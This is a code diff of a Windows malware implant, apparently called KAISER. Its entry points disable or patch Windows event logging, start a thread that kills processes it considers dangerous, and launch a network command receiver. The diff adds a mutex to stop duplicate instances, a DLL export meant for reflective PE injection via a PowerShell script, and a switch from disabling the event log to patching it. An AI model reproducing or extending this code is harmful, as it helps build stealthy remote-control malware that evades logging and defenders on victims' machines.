@@ -6,13 +6,14 @@
 #include "purge.h"
 #include "utils.h"
 
+#ifdef _DEBUG
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
 	// No, sir! I would not like to be monitored!
 	EvtlogAction(EVTLOG_DISABLE);
 	
 	// Watch for new processes and die on anything dangerous.
 	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PurgeProcessMonitor, NULL, 0, NULL) == NULL) {
-		NetSend(L"Failed to create process notification thread; error: %lu", GetLastError());
+		//NetSend(L"Failed to create process notification thread; error: %lu", GetLastError());
 	}
 
 	INT iSuccess = InitWsa();
@@ -27,11 +28,17 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 
 	return 0;
 }
-
+#else
 // For Invoke-ReflectivePEInjection.ps1
 __declspec(dllexport) void VoidFunc(void) {
+	// Mutex to stop multiple instances.
+	HANDLE hMutex = CreateMutex(NULL, TRUE, L"KAISER");
+	if (GetLastError() == ERROR_ALREADY_EXISTS) {
+		return;
+	}
+
 	// No, sir! I would not like to be monitored!
-	EvtlogAction(EVTLOG_DISABLE);
+	EvtlogAction(EVTLOG_PATCH);
 
 	// Watch for new processes and die on anything dangerous.
 	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PurgeProcessMonitor, NULL, 0, NULL) == NULL) {
@@ -46,6 +53,8 @@ __declspec(dllexport) void VoidFunc(void) {
 	
 	CommandStartReceiver();
 	
+	ReleaseMutex(hMutex);
+
 	FreeWsa();
 }
 
@@ -57,3 +66,4 @@ BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved) {
 
 	return TRUE;
 }
+#endif
